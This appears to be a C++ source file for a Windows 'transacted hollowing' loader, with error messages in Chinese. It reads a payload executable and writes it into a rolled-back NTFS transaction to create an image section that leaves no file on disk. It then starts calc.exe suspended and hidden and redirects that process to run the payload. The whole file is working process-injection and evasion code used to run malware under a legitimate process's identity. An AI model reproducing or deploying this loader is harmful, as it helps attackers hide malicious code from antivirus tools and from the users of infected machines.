#pragma once
#include <Windows.h>
#include <KtmW32.h>
#include <iostream>
#include <stdio.h>
#include "kernel32_undoc.h"
#include "hollowing_parts.h"

#pragma comment(lib, "KtmW32.lib")
#pragma comment(lib, "Ntdll.lib")


int main()
{
    wchar_t defaultTarget[MAX_PATH] = { 0 };
    const wchar_t* payloadPath = L"C:\\Users\\Public\\HashCalc.exe";
    size_t payloadSize = 0;
    const HANDLE file = CreateFileW(payloadPath, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
    if (file == INVALID_HANDLE_VALUE) {
        std::cerr << "文件无法打开(CreateFileW)!" << std::endl;
        return -1;
    }
    payloadSize = GetFileSize(file, 0);
    const HANDLE mapping = CreateFileMapping(file, 0, PAGE_READONLY, 0, 0, 0);
    if (!mapping) {
        std::cerr << "无法创建映射!" << std::endl;
        CloseHandle(file);
        return -1;
    }
    auto dllRawData = (BYTE*)MapViewOfFile(mapping, FILE_MAP_READ, 0, 0, 0);
    if (dllRawData == nullptr) {
        std::cerr << "无法映射(map)文件" << std::endl;
        CloseHandle(mapping);
        CloseHandle(file);
        return -1;
    }
    auto localCopyAddress = (BYTE*)VirtualAlloc(NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (localCopyAddress == NULL) {
        std::cerr << "无法在当前进程中分配内存" << std::endl;
        return -1;
    }
    memcpy(localCopyAddress, dllRawData, payloadSize);
    UnmapViewOfFile(dllRawData);
    CloseHandle(mapping);
    CloseHandle(file);
    auto payladBuf = localCopyAddress;
    if (payladBuf == NULL) {
        std::cerr << "无法读取 payload!" << std::endl;
        return -1;
    }
    ExpandEnvironmentStringsW(L"%SystemRoot%\\SysWoW64\\calc.exe", defaultTarget, MAX_PATH);

    wchar_t dummy_name[MAX_PATH] = { 0 };
    wchar_t temp_path[MAX_PATH] = { 0 };
    auto size = GetTempPathW(MAX_PATH, temp_path);
    GetTempFileNameW(temp_path, L"TH", 0, dummy_name);

    uint32_t options, isolationLvl, isolationFlags, timeout;
    options = isolationLvl = isolationFlags = timeout = 0;

    HANDLE hTransaction = CreateTransaction(nullptr, nullptr, options, isolationLvl, isolationFlags, timeout, nullptr);
    if (hTransaction == INVALID_HANDLE_VALUE) {
        std::cerr << "无法创建事务!" << std::endl;
        return -1;
    }
    HANDLE hTransactedFile = CreateFileTransactedW(dummy_name,
        GENERIC_WRITE | GENERIC_READ,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL,
        hTransaction,
        NULL,
        NULL
    );
    if (hTransactedFile == INVALID_HANDLE_VALUE) {
        std::cerr << "无法创建事务文件: " << GetLastError() << std::endl;
        return -1;
    }
    DWORD  writtenLen = 0;
    if (!WriteFile(hTransactedFile, payladBuf, payloadSize, &writtenLen, NULL)) {
        std::cerr << "无法写入payload Error: " << GetLastError() << std::endl;
        return -1;
    }
    HANDLE hSection = nullptr;
    NTSTATUS status = NtCreateSection(&hSection,
        SECTION_ALL_ACCESS,
        NULL,
        0,
        PAGE_READONLY,
        SEC_IMAGE,
        hTransactedFile
    );
    if (status != STATUS_SUCCESS) {
        std::cerr << "NtCreateSection failed" << std::endl;
        return -1;
    }
    CloseHandle(hTransactedFile);
    hTransactedFile = nullptr;
    if (RollbackTransaction(hTransaction) == FALSE) {
        std::cerr << "RollbackTransaction failed: " << std::hex << GetLastError() << std::endl;
        return -1;
    }
    CloseHandle(hTransaction);
    hTransaction = nullptr;

    wchar_t* start_dir = NULL;
    wchar_t dir_path[MAX_PATH] = { 0 };
    memset(dir_path, 0, NULL);
    memcpy(dir_path, defaultTarget, NULL);

    wchar_t* name_ptr = get_file_name(dir_path);
    if (name_ptr != nullptr) {
        *name_ptr = '\0'; //cut it
    }



    if (wcsnlen(dir_path, MAX_PATH) > 0) {
        start_dir = dir_path;
    }
    PROCESS_INFORMATION pi = { 0 };
    if (!load_kernel32_functions()) return false;
    STARTUPINFOW si = { 0 };
    si.cb = sizeof(STARTUPINFOW);
    memset(&pi, 0, sizeof(PROCESS_INFORMATION));
    const HANDLE hToken = NULL;
    HANDLE hNewToken = NULL;
    if (!CreateProcessInternalW(hToken,
        NULL, //lpApplicationName
        (LPWSTR)defaultTarget, //lpCommandLine
        NULL, //lpProcessAttributes
        NULL, //lpThreadAttributes
        FALSE, //bInheritHandles
        CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW, //dwCreationFlags
        NULL, //lpEnvironment 
        start_dir, //lpCurrentDirectory
        &si, //lpStartupInfo
        &pi, //lpProcessInformation
        &hNewToken
    ))
    {
        printf("[ERROR] CreateProcessInternalW failed, Error = %x\n", GetLastError());
        return false;
    }
    std::cout << "创建进程, PID: " << std::dec << pi.dwProcessId << "\n";
    const HANDLE hProcess = pi.hProcess;
    NTSTATUS statusT = STATUS_SUCCESS;
    SIZE_T viewSize = 0;
    PVOID sectionBaseAddress = 0;
    if ((statusT = NtMapViewOfSection(hSection, hProcess, &sectionBaseAddress, NULL, NULL, NULL, &viewSize, ViewShare, NULL, PAGE_READONLY)) != STATUS_SUCCESS)
    {
        if (statusT == STATUS_IMAGE_NOT_AT_BASE) {
            std::cerr << "[WARNING] Image could not be mapped at its original base! If the payload has no relocations, it won't work!\n";
        }
        else {
            std::cerr << "[ERROR] NtMapViewOfSection failed, statusT: " << std::hex << statusT << std::endl;
            return NULL;
        }
    }
    std::cout << "Mapped Base:\t" << std::hex << (ULONG_PTR)sectionBaseAddress << "\n";
    PVOID remote_base = sectionBaseAddress;
    if (!remote_base) {
        std::cerr << "映射缓冲区失败!\n";
        return false;
    }

    if (!redirect_to_payload(payladBuf, remote_base, pi, TRUE)) {
        std::cerr << "重定向失败!\n";
        return false;
    }

    std::cout << "恢复线程, PID " << std::dec << pi.dwProcessId << std::endl;
    ResumeThread(pi.hThread);
    VirtualFree(payladBuf, 0, MEM_RELEASE);
    system("pause");

    return 0;
}
